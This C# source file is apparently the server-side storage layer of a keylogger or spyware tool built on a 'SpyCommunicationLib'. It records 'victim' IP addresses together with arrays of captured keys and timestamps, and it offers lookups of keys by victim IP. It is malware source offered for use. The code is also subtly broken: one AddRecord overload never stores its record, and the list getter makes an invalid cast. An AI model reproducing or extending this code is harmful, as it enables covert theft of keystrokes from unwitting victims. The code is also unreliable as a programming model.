using SpyCommunicationLib.Entities;

namespace Server.Data
{
    class RecordData : ICloneable
    {
        public int Id { get; set; }
        public string Ip { get; set; }
        public int[] Keys { get; set; }
        public DateTime Date { get; set; }

        public object Clone()
        {
            return new RecordData
            {
                Id = this.Id,
                Ip = this.Ip,
                Keys = (int[])this.Keys.Clone(),
                Date = this.Date
            };
        }
    }

    class RecordsGenerator
    {
        private static int _globalId = 0;
        public static int GlobalId {
            get => _globalId; 
            set {
                if (_globalId < value)
                    _globalId = value;
            }
        }

        public static RecordData SetNewId(RecordData record)
        {
            record.Id = _globalId++;
            return record;
        }

        public static RecordData GenerateVictimRecord(int[] keys, string ip)
        {
            return new RecordData
            {
                   Id = _globalId++,
                   Ip = ip,
                   Date = DateTime.Now,
                   Keys = keys
            };
        }
    }

    class RecordsContainer
    {
        private static object _locker = new();
        private static HashSet<string> _victims_ip = new HashSet<string>();
        private static List<RecordData> _records = new List<RecordData>();

        public static void AddRecord(int[] keys, string ip)
        {
            if (!_victims_ip.Contains(ip))
            {
                lock (_locker)
                    _victims_ip.Add(ip); 
            }

            lock (_locker) {
                _records.Add(RecordsGenerator.GenerateVictimRecord(keys, ip));
            }
        }

        public static void AddRecord(RecordData record)
        {
            if (record.Id <= RecordsGenerator.GlobalId)
                RecordsGenerator.SetNewId(record);
            else
                RecordsGenerator.GlobalId = record.Id;
        }

        public static List<VictimRecord> GetRecordsList()
        {
            return _records
                .AsParallel()
                .Select(r => (VictimRecord)r.Clone())
                .ToList();
        }

        public static List<string> GetVictimsIps()
        {
            return _victims_ip.ToList();
        }

        public static List<RecordData> GetRecordsByIp(string ip)
        {
            return _records
                .AsParallel()
                .Where(r => r.Ip == ip)
                .Select(r => (RecordData)r.Clone())
                .ToList();
        }
    }


}
